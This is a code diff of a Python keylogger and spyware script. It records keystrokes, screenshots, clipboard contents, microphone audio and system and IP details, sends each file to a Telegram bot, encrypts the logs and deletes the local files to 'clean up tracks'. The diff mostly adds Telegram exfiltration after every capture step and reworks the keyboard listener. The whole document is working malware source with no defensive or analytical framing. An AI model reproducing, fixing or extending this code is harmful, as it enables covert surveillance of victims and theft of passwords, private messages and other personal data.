@@ -1,22 +1,16 @@
 import requests
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
-import socket
-import platform
-import pyperclip  # Replace win32clipboard with pyperclip
 from pynput.keyboard import Key, Listener
 import time
 import os
+from cryptography.fernet import Fernet
+from PIL import ImageGrab
+import getpass
+import socket
+import platform
+import  pyperclip
 from scipy.io.wavfile import write
 import sounddevice as sd
-from cryptography.fernet import Fernet
-import getpass
 from requests import get
-from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
 
 # Define file paths and Telegram bot information
 keys_information = "key_log.txt"
@@ -39,9 +33,17 @@ username = getpass.getuser()
 
 key = "jmJ1hppnj8npXmYe13w3nUBH3KfUClQu0PLWS1VvTHk="
 
-file_path = "home\kali\Desktop\keylogger"
+file_path = "D:\\python project\\pythonProject\\python"
 extend = "\\"
 file_merge = file_path + extend
+
+# Initialize global variables
+keys = []
+count = 0
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+logging_active = True
 
 # Function to send a file via Telegram
 def send_file_via_telegram(file_path, file_name, chat_id, bot_token):
@@ -58,6 +60,64 @@ def send_file_via_telegram(file_path, file_name, chat_id, bot_token):
     except Exception as e:
         print(f"Error occurred: {e}")
 
+# Take a screenshot
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+    send_file_via_telegram(file_path, screenshot_information, chat_id, bot_token)
+
+# Keylogger to record keystrokes
+def on_press(key):
+    global keys, count, currentTime
+    keys.append(key)
+    count += 1
+    currentTime = time.time()
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write(' ')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_release(key):
+    global currentTime, stoppingTime, number_of_iterations, logging_active
+
+    # Stop logging if Ctrl + X is pressed
+    if key == Key.ctrl_l or key == Key.ctrl_r:  # Check if Ctrl is pressed
+        if Key.x in keys:
+            print("Ctrl + X pressed. Stopping the keylogger.")
+            logging_active = False
+            listener.stop()  # Stop the listener
+            return
+
+    if currentTime > stoppingTime:
+        # Reset variables and continue logging
+        with open(file_path + extend + keys_information, "w") as f:
+            f.write(" ")
+
+        screenshot()
+        copy_clipboard()
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
+
+        # Send the updated key log to Telegram
+        send_file_via_telegram(file_path, keys_information, chat_id, bot_token)
+
+# Start the keylogger
+listener = Listener(on_press=on_press, on_release=on_release)
+listener.start()
+
 # Get the computer information
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
@@ -65,16 +125,18 @@ def computer_information():
         IPAddr = socket.gethostbyname(hostname)
         try:
             public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip + "\n")
+            f.write("Public IP Address: " + public_ip)
 
         except Exception:
-            f.write("Couldn't get Public IP Address (most likely max query)\n")
+            f.write("Couldn't get Public IP Address (most likely max query)")
 
-        f.write("Processor: " + platform.processor() + '\n')
+        f.write("Processor: " + (platform.processor()) + '\n')
         f.write("System: " + platform.system() + " " + platform.version() + '\n')
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
+
+    send_file_via_telegram(file_path, system_information, chat_id, bot_token)
 
 computer_information()
 
@@ -83,14 +145,18 @@ def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
             pasted_data = pyperclip.paste()
-            f.write("Clipboard Data: \n" + pasted_data + "\n")
-
+            f.write("Clipboard Data: \n" + pasted_data)
         except Exception as e:
-            f.write("Clipboard could not be copied: " + str(e) + "\n")
+            f.write("Clipboard could not be copied\n")
+            f.write(f"Error: {e}\n")
+
+    
+
+    send_file_via_telegram(file_path, clipboard_information, chat_id, bot_token)
 
 copy_clipboard()
 
-# Get the microphone recording
+# Record audio from the microphone
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -99,71 +165,17 @@ def microphone():
     sd.wait()
 
     write(file_path + extend + audio_information, fs, myrecording)
+    send_file_via_telegram(file_path, audio_information, chat_id, bot_token)
 
-# Get screenshots
-def screenshot():
-    im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_information)
+microphone()
 
-screenshot()
-
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
-
-# Time for keylogger
-while number_of_iterations < number_of_iterations_end:
-
-    count = 0
-    keys = []
-
-    def on_press(key):
-        global keys, count, currentTime
-        print(key)
-        keys.append(key)
-        count += 1
-        currentTime = time.time()
-
-        if count >= 1:
-            count = 0
-            write_file(keys)
-            keys = []
-
-    def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find("space") > 0:
-                    f.write('\n')
-                elif k.find("key") == -1:
-                    f.write(k)
-
-    def on_release(key):
-        if key == Key.esc:  # Use Key.esc instead of key.esc
-            send_file_via_telegram(file_path, keys_information, chat_id, bot_token)
-            return False
-        if currentTime > stoppingTime:
-            return False
-
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
-    if currentTime > stoppingTime:
-        with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
-
-        def screenshot():
-            im = ImageGrab.grab()
-            im.save(file_merge + screenshot_information)
-
-        copy_clipboard()
-        number_of_iterations += 1
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
+while logging_active:  # Continue keylogging while logging_active is True
+    time.sleep(1)
 
 # Encrypt files
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
-encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
+                        file_merge + keys_information_e]
 
 count = 0
 
@@ -177,12 +189,12 @@ for encrypting_file in files_to_encrypt:
     with open(encrypted_file_names[count], 'wb') as f:
         f.write(encrypted)
 
-    send_file_via_telegram(encrypted_file_names[count], encrypted_file_names[count], bot_token)
+    send_file_via_telegram(file_merge, encrypted_file_names[count], chat_id, bot_token)
     count += 1
 
 time.sleep(120)
 
-# Clean up our tracks and delete files
+# Clean up tracks and delete files
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 for file in delete_files:
     os.remove(file_merge + file)
